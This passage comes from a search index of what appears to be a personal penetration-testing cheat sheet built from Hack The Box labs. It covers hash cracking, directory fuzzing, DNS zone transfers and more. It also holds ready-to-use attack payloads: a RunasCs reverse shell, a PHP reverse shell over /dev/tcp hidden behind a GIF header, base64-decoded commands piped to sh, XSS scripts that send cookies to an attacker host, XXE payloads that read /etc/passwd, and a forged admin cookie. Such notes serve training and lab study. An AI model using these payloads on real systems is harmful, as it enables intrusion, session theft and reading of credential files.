sa_flags=SA_RESTORER|SA_RESTART|SA_RESETHAND|SA_SIGINFO, sa_restorer=0x10073b0}, NULL, 8) = 0\nrt_sigaction(SIGPIPE, {sa_handler=0x1005db0, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x10073b0}, NULL, 8) = 0\nmmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7feab493e000\nwrite(2, \"\\n\", 1\n)                       = 1\nwrite(2, \" \\342\\226\\210\\342\\226\\210\\342\\226\\210\\342\\226\\204 \\342\\226\\204\\342\\226\\210\\342\\226\\210\\342\\226\\210\\342\\226\\223 \\342\\226\"..., 527 \u2588\u2588\u2588\u2584 \u2584\u2588\u2588\u2588\u2593 \u2588\u2588 \u2584\u2588\u2580  \u2588\u2588\u2588\u2588\u2588\u2588 \n \u2593\u2588\u2588\u2592\u2580\u2588\u2580 \u2588\u2588\u2592 \u2588\u2588\u2584\u2588\u2592 \u2592\u2588\u2588    \u2592 \n \u2593\u2588\u2588    \u2593\u2588\u2588\u2591\u2593\u2588\u2588\u2588\u2584\u2591 \u2591 \u2593\u2588\u2588\u2584   \n \u2592\u2588\u2588    \u2592\u2588\u2588 \u2593\u2588\u2588 \u2588\u2584   \u2592   \u2588\u2588\u2592\n \u2592\u2588\u2588\u2592   \u2591\u2588\u2588\u2592\u2592\u2588\u2588\u2592 \u2588\u2584\u2592\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\n \u2591 \u2592\u2591   \u2591  \u2591\u2592 \u2592\u2592 \u2593\u2592\u2592 \u2592\u2593\u2592 \u2592 \u2591\n \u2591  \u2591      \u2591\u2591 \u2591\u2592 \u2592\u2591\u2591 \u2591\u2592  \u2591 \u2591\n \u2591      \u2591   \u2591 \u2591\u2591 \u2591 \u2591  \u2591  \u2591  \n    \u2591   \u2591  \u2591         \u2591) = 527\nwrite(2, \"\\n\", 1\n)                       = 1\nwrite(2, \"\\nSkaffolding utility to create a\"..., 68\nSkaffolding utility to create a simple structure for htb machines.\n) = 68\nwrite(2, \"Made by jd-apprentice\\n\", 22Made by jd-apprentice\n) = 22\nwrite(2, \"\\n\", 1\n)                       = 1\nwrite(2, \"Usage: mks &lt;folder_name&gt;\\n\", 25Usage: mks &lt;folder_name&gt;\n) = 25\nexit(1)                                 = ?\n+++ exited with 1 +++\n</code></pre> <p>This is a simple example of how to use strace. It will show you all the system calls that the program makes.</p>"},{"location":"system/windows/","title":"Windows","text":""},{"location":"system/windows/#runascs","title":"RunasCS","text":"<pre><code>.\\RunasCs.exe openfire \"HotP!fireguard\" cmd.exe -r 10.10.14.44:5555\n</code></pre>"},{"location":"system/windows/#ds-store","title":"DS-Store","text":"<p>When we found a <code>.DS_Store</code> file on a web server, we can use the <code>ds_walk.py</code> script to enumerate directories based on the <code>.DS_Store</code> file.</p> <pre><code>python3 scripts/ds_walk.py -u &lt;URL&gt;\n[!] .ds_store file is present on the webserver.\n[+] Enumerating directories based on .ds_server file:\n----------------------------\n[!] http://10.13.38.11/admin\n[!] http://10.13.38.11/dev\n[!] http://10.13.38.11/iisstart.htm\n[!] http://10.13.38.11/Images\n[!] http://10.13.38.11/JS\n[!] http://10.13.38.11/META-INF\n[!] http://10.13.38.11/New folder\n[!] http://10.13.38.11/New folder (2)\n[!] http://10.13.38.11/Plugins\n[!] http://10.13.38.11/Templates\n[!] http://10.13.38.11/Themes\n[!] http://10.13.38.11/Uploads\n[!] http://10.13.38.11/web.config\n[!] http://10.13.38.11/Widgets\n----------------------------\n[!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1\n[!] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc\n----------------------------\n[!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/core\n[!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db\n[!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/include\n[!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/src\n----------------------------\n[!] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/core\n[!] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db\n[!] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/include\n[!] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/src\n----------------------------\n[!] http://10.13.38.11/Images/buttons\n[!] http://10.13.38.11/Images/icons\n[!] http://10.13.38.11/Images/iisstart.png\n----------------------------\n[!] http://10.13.38.11/JS/custom\n----------------------------\n[!] http://10.13.38.11/Themes/default\n----------------------------\n[!] http://10.13.38.11/Widgets/CalendarEvents\n[!] http://10.13.38.11/Widgets/Framework\n[!] http://10.13.38.11/Widgets/Menu\n[!] http://10.13.38.11/Widgets/Notifications\n----------------------------\n[!] http://10.13.38.11/Widgets/Framework/Layouts\n----------------------------\n[!] http://10.13.38.11/Widgets/Framework/Layouts/custom\n[!] http://10.13.38.11/Widgets/Framework/Layouts/default\n</code></pre>"},{"location":"techniques/cracking/","title":"Cracking","text":""},{"location":"techniques/cracking/#hashes","title":"Hashes","text":"<p>hash identifier</p> <pre><code>hashid &lt;HASH&gt;\n</code></pre> <p>example hashes</p> <pre><code>hashcat -m &lt;MODE&gt; &lt;HASH&gt; &lt;WORDLIST&gt;\nhashcat -m 22931 ../wordlists/users/ssh_david.txt ../wordlists/rockyou.txt\n</code></pre>"},{"location":"techniques/cracking/#mash-attack","title":"Mash attack","text":"<p>When we know the password length or the password pattern</p> <pre><code>hashcat -a 3 -m 1400 &lt;HASH&gt; &lt;PASSWORD&gt;&lt;MASK&gt; # https://hashcat.net/wiki/doku.php?id=mask_attack\n</code></pre>"},{"location":"techniques/cracking/#ssh","title":"SSH","text":"<p>read</p> <pre><code>ssh2john id_rsa &gt; id_rsa.hash\nzip2john &lt;ZIP&gt; &gt; &lt;ZIP&gt;.text\njohn --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash\njohn --wordlist=/usr/share/wordlists/rockyou.txt &lt;ZIP&gt;.text\n</code></pre>"},{"location":"techniques/cracking/#zip","title":"ZIP","text":"<pre><code>sudo apt install fcrackzip\nfcrackzip -u -D -p rockyou.txt &lt;FILE&gt;\n</code></pre>"},{"location":"techniques/cracking/#find-strings","title":"Find strings","text":"<p>We can use <code>strings</code> to find strings in a file</p> <p>It can be a database, a binary, a .exe, a disk, etc.</p> <pre><code>strings &lt;FILE&gt;\n</code></pre>"},{"location":"techniques/discovery/","title":"Discovery","text":"<p>Discovery is the process of finding information about a target. This can include finding open ports, services, and directories.</p>"},{"location":"techniques/discovery/#feroxbuster","title":"Feroxbuster","text":"<p>feroxbuster</p> <pre><code>`feroxbuster --insecure -u http://10.10.10.75/nibbleblog -o ferox -w ~/Documents/Security/wordlists/php.txt`\n</code></pre> <ul> <li><code>--insecure</code> : Ignore SSL certificate errors</li> <li><code>-u</code> : URL to scan</li> <li><code>-o</code> : Output directory</li> <li><code>-w</code> : Wordlist to use</li> </ul>"},{"location":"techniques/discovery/#dirsearch","title":"Dirsearch","text":"<p>dirsearch</p> <pre><code>dirsearch -u 40.121.87.195:60000 -w ~/Documents/Security/wordlists/raft-medium-directories.txt -t 100\n</code></pre> <ul> <li><code>-u</code> : URL to scan</li> <li><code>-w</code> : Wordlist to use</li> <li><code>-t</code> : Number of threads</li> </ul>"},{"location":"techniques/discovery/#amass","title":"Amass","text":"<p>amass</p>"},{"location":"techniques/discovery/#cheatsheet","title":"Cheatsheet","text":"<p>art-of-subdomain-enumeration pentester.land</p>"},{"location":"techniques/encode/","title":"Encode","text":"<p>Encoding is the process of converting data from one form to another. It is used to protect data from unauthorized access and to ensure that the data is not corrupted during transmission.</p> <p>base64</p>"},{"location":"techniques/encode/#encode-a-value-with-bash","title":"Encode a value with bash","text":"<p>read</p> <pre><code>echo -n \"id\" | base64\n## Result: aWQ=\n</code></pre>"},{"location":"techniques/encode/#execute-a-command-encoded","title":"Execute a command encoded","text":"<pre><code>echo \"aWQ=\" | base64 --decode | sh\n## Result: uid=0(root) gid=0(root) groups=0(root)\n</code></pre>"},{"location":"techniques/file_bypass/","title":"File by pass","text":"<p>In some cases, the web application will only allow certain file extensions to be uploaded. However, the application may not check the file content, only the file extension. This can be exploited by uploading a file with a valid extension, but with a different file type. For example, a PHP file can be uploaded with a <code>.jpg</code> extension. This can be used to execute code on the server.</p>"},{"location":"techniques/file_bypass/#example","title":"Example","text":"<pre><code>------WebKitFormBoundaryBqdknE02TXAj3VxC\nContent-Disposition: form-data; name=\"file\"; filename=\"reverse.php\"\nContent-Type: image/gif\n\nGIF87a;&lt;?php\nexec(\"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.11/4444 0&gt;&amp;1'\");\n?&gt;\n\n------WebKitFormBoundaryBqdknE02TXAj3VxC\nContent-Disposition: form-data; name=\"submit\"\n\nSubmit Screenshot\n------WebKitFormBoundaryBqdknE02TXAj3VxC--\n</code></pre> <p><code>GIF87a;</code> is the header of a GIF file. <code>&lt;?php exec(\"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;IP&gt; 0&gt;&amp;1'\"); ?&gt;</code> is the PHP code that will be executed on the server.</p> <p>Here, a PHP file is uploaded with a <code>.gif</code> extension. When the server processes the file, it will execute the PHP code and create a reverse shell.</p> <p>Then when we access this image, the server will execute the PHP code and create a reverse shell from the listener we have set up.</p> <pre><code>curl http://&lt;IP&gt;/uploads/reverse.php\n</code></pre>"},{"location":"techniques/file_bypass/#links","title":"Links","text":"<ul> <li>https://book.hacktricks.xyz/pentesting-web/file-upload</li> </ul>"},{"location":"techniques/fuzzing/","title":"Fuzzing","text":"<p>Fuzzing is a technique used to find vulnerabilities in software by providing unexpected input to the software. This can be done by providing unexpected input to a web application, or by providing unexpected input to a binary.</p>"},{"location":"techniques/fuzzing/#wfuzz","title":"Wfuzz","text":"<p>wfuzz</p> <pre><code>wfuzz --hw=153 -c -t 200 -w ~/Documents/Security/wordlists/common.txt http://40.121.87.195:60004/\\?file\\=..//FUZZ.txt\n</code></pre> <pre><code>wfuzz -c --hh=3245 -w ~/Documents/Security/wordlists/common.txt -H \"HOST: FUZZ.&lt;URL&gt;\" http://&lt;URL&gt;\n</code></pre> <ul> <li><code>--hw</code> : Hide words with length equal to or less than the specified value</li> <li><code>-c</code> : Show output in color</li> <li><code>-t</code> : Number of threads</li> <li><code>-w</code> : Wordlist to use</li> <li><code>FUZZ</code> : Where the payload will be placed</li> </ul>"},{"location":"techniques/fuzzing/#wfpayload","title":"Wfpayload","text":"<p>Wfpayload is a tool that generates payloads for fuzzing.</p> <p>In this case where we know the range of the payload we can use the following command to generate a payload.</p> <pre><code>wfpayload -z range --zD 0000-6000 &gt; payload.txt\nwfuzz -c --hw=31 --hc=404 -w payload.txt http://10.13.37.11/backups/backup_2024032823FUZZ.zip\n</code></pre>"},{"location":"techniques/stenography/","title":"Stenography","text":""},{"location":"techniques/stenography/#stegseek","title":"Stegseek","text":"<p>Stegseek is a simple and effective way to find steganography in most common file formats</p> <pre><code>stegseek --crack hackerman.jpeg ~/Documents/Security/wordlists/rockyou.txt\nStegSeek 0.6 - https://github.com/RickdeJager/StegSeek\n\n[i] Found passphrase: \"budapest07\"        \n[i] Original filename: \"flag.txt\".\n[i] Extracting to \"hackerman.jpeg.out\".\n</code></pre>"},{"location":"techniques/xss/","title":"XSS","text":"<p>XSS is a type of security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. These scripts can steal sensitive information, deface websites, or redirect users to malicious sites. XSS attacks are commonly used to bypass access controls, steal session cookies, and perform other malicious activities.</p>"},{"location":"techniques/xss/#types-of-xss","title":"Types of XSS","text":"<ol> <li> <p>Reflected XSS: The attacker injects a malicious script into a URL that is reflected back to the user. This type of XSS is typically found in search fields, error messages, and other user input fields.</p> </li> <li> <p>Stored XSS: The attacker injects a malicious script into a web application, which is then stored on the server and executed whenever a user accesses the affected page. This type of XSS is commonly found in comment sections, forums, and other user-generated content.</p> </li> <li> <p>DOM-based XSS: The attacker injects a malicious script into the DOM (Document Object Model) of a web page, which is then executed by the client-side code. This type of XSS is typically found in client-side JavaScript code that processes user input.</p> </li> </ol>"},{"location":"techniques/xss/#example-of-reflected-xss","title":"Example of Reflected XSS","text":"<p>Suppose we have a vulnerable web application that reflects user input without proper sanitization. An attacker can inject a malicious script into a URL parameter, which is then reflected back to the user.</p> <ol> <li> <p>Vulnerable URL: <code>http://example.com/search?query=&lt;script&gt;alert('XSS')&lt;/script&gt;</code></p> </li> <li> <p>Stored XSS: The attacker injects a script that steals the user's session cookie and sends it to a remote server.</p> </li> </ol> <pre><code>&lt;script&gt;\n  document.location = 'http://&lt;IP&gt;/?c=' + document.cookie;\n&lt;/script&gt;\n</code></pre> <ol> <li>DOM-based XSS: The attacker injects a script that redirects the user to a phishing site.</li> </ol> <pre><code>&lt;img src=x onerror=\"document.location='http://&lt;IP&gt;/?c='+document.cookie;\"&gt;\n</code></pre>"},{"location":"techniques/xss/#links","title":"Links","text":"<ul> <li>https://github.com/payloadbox/xss-payload-list</li> <li>https://github.com/s0md3v/XSStrike</li> <li>https://github.com/hahwul/dalfox</li> </ul>"},{"location":"web/cookies/","title":"Cookies","text":"<p>Cookies are small pieces of data that are stored in the user's browser. They are used to store information about the user's session, such as their preferences, login status, and shopping cart contents.</p>"},{"location":"web/cookies/#example","title":"Example","text":"<pre><code>PHPSESSID=eyJ1c2VybmFtZSI6InRlc3QifQ%3D%3D\n</code></pre> <p>The <code>%3D</code> is the URL encoded version of <code>=</code>.</p> <p>Here we have a cookie that stores a value in base64, if we decode it we get:</p> <pre><code>{\"username\":\"test\"}\n</code></pre> <p></p> <p>Here we can see that the username is test.</p> <p>Which was the username I created in the application. Now if we want to instead use the username admin and encoded back to base64 we get:</p> <pre><code>PHPSESSID=eyJ1c2VybmFtZSI6ImFkbWluIn0=\n</code></pre> <p></p> <p>Now we can see that the username is admin. This example is from a challenge called <code>baby auth</code> from <code>HTB</code></p> <ul> <li>https://app.hackthebox.com/challenges/179</li> </ul>"},{"location":"web/dns/","title":"DNS","text":"<p>DNS (Domain Name System) is a system that translates domain names to IP addresses. It is a distributed database that contains records for every domain name on the internet.</p>"},{"location":"web/dns/#locate","title":"Locate","text":"<p>Whenever we have an IP address, we can use wget to find the domain name.</p> <pre><code>wget --server-response 10.10.11.194      \n--2024-03-01 22:32:36--  http://10.10.11.194/\nConnecting to 10.10.11.194:80... connected.\nHTTP request sent, awaiting response... \n  HTTP/1.1 301 Moved Permanently\n  Server: nginx/1.18.0 (Ubuntu)\n  Date: Sat, 02 Mar 2024 01:32:37 GMT\n  Content-Type: text/html\n  Content-Length: 178\n  Connection: keep-alive\n  Location: http://soccer.htb/\nLocation: http://soccer.htb/ [following]\n--2024-03-01 22:32:37--  http://soccer.htb/\nResolving soccer.htb (soccer.htb)... failed: Name or service not known.\nwget: unable to resolve host address \u2018soccer.htb\u2019\n</code></pre> <p>Also sometimes <code>cURL</code> can be used to find the domain name.</p> <pre><code>curl -I &lt;IP&gt;  \n\nHTTP/1.1 301 Moved Permanently\nServer: nginx/1.18.0 (Ubuntu)\nDate: Sat, 02 Mar 2024 01:27:24 GMT\nContent-Type: text/html\nContent-Length: 178\nConnection: keep-alive\nLocation: http://soccer.htb/\n</code></pre> <p>If we have the dns server, we can use dig to find subdomains.</p> <pre><code>dig axfr bank.htb @10.10.10.29                                                                 \n\n; &lt;&lt;&gt;&gt; DiG 9.18.18-0ubuntu0.22.04.2-Ubuntu &lt;&lt;&gt;&gt; axfr bank.htb @10.10.10.29\n;; global options: +cmd\nbank.htb.               604800  IN      SOA     bank.htb. chris.bank.htb. 2 604800 86400 2419200 604800\nbank.htb.               604800  IN      NS      ns.bank.htb.\nbank.htb.               604800  IN      A       10.10.10.29\nns.bank.htb.            604800  IN      A       10.10.10.29\nwww.bank.htb.           604800  IN      CNAME   bank.htb.\nbank.htb.               604800  IN      SOA     bank.htb. chris.bank.htb. 2 604800 86400 2419200 604800\n;; Query time: 184 msec\n;; SERVER: 10.10.10.29#53(10.10.10.29) (TCP)\n;; WHEN: Fri Mar 15 00:14:29 -03 2024\n;; XFR size: 6 records (messages 1, bytes 171)\n</code></pre> <p>Reverse DNS lookup can also be used to find the domain name.</p> <pre><code>dig @ip -x ip\n;; AUTHORITY SECTION:\n37.13.10.in-addr.arpa.  604800  IN      SOA     www.x.jet. x.jet. 3 604800 86400 2419200\n</code></pre> <p>Where:</p> <ul> <li><code>@</code> is the DNS server to use.</li> <li><code>-x</code> is the reverse lookup option.</li> <li><code>ip</code> is the IP address to lookup.</li> </ul> <p>Once we have the domain name, we can add it to the <code>/etc/hosts</code> file.</p> <pre><code>sudo nano /etc/hosts\n\n127.0.0.1       localhost\n127.0.1.1       dyallo-MS-7A39\n10.10.11.194    soccer.htb\n10.10.10.29     bank.htb\n</code></pre> <p>Then when we access the ip address, we can see the website.</p>"},{"location":"web/headers/","title":"Headers","text":"<p>HTTP headers contain metadata in key-value pairs that are sent along with HTTP requests and responses. They can be used to define caching behavior, facilitate authentication, and manage session state. HTTP headers help the API client and server communicate more effectively\u2014and enable developers to optimize and customize the API\u2019s behavior.</p>"},{"location":"web/headers/#user-agent","title":"User-Agent","text":"<p>We can do a XSS attack by changing the User-Agent header to a malicious payload. For example, we can use the following payload to steal the cookie:</p> <pre><code>User-Agent: &lt;script&gt;document.location='&lt;IP&gt;/?c='+document.cookie&lt;/script&gt;\nUser-Agent: &lt;img src=x onerror=\"this.src='http://10.10.14.9/?c='+document.cookie;\"/&gt;\n</code></pre> <p>Before this, we should have netcat listening on port 80:</p> <pre><code>nc -lvnp 80\n</code></pre>"},{"location":"web/subdomains/","title":"Subdomains","text":""},{"location":"web/subdomains/#sublist3r","title":"Sublist3r","text":"<pre><code>sublist3r -d &lt;DOMAIN&gt;\n</code></pre>"},{"location":"web/subdomains/#webcopilot","title":"Webcopilot","text":"<p>webcopilot</p> <pre><code>webcopilot -d &lt;DOMAIN&gt;\n</code></pre>"},{"location":"web/subdomains/#nmap","title":"Nmap","text":"<pre><code>nmap --script dns-brute &lt;DOMAIN&gt;\n</code></pre>"},{"location":"web/subdomains/#others","title":"Others","text":"<ul> <li>altdns</li> </ul>"},{"location":"web/xml/","title":"XML","text":"<p>XML is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable.</p>"},{"location":"web/xml/#xxe-xml-external-entity","title":"XXE (XML External Entity)","text":"<p>Read <code>/etc/passwd</code> file with PHP</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;\n&lt;!DOCTYPE data [\n&lt;!ENTITY file SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\"&gt; ]&gt;\n&lt;foo&gt;\n    &lt;response&gt;&amp;file;&lt;/response&gt;\n&lt;/foo&gt;\n</code></pre> <p>Read <code>/etc/passwd</code> flat</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;\n&lt;!DOCTYPE data [\n&lt;!ENTITY file SYSTEM \"file:///etc/passwd\"&gt; ]&gt;\n&lt;foo&gt;\n    &lt;response&gt;&amp;file;&lt;/response&gt;\n&lt;/foo&gt;\n</code></pre>"},{"location":"web/xml/#links","title":"Links","text":"<ul> <li>XXE Injection</li> </ul>"}]}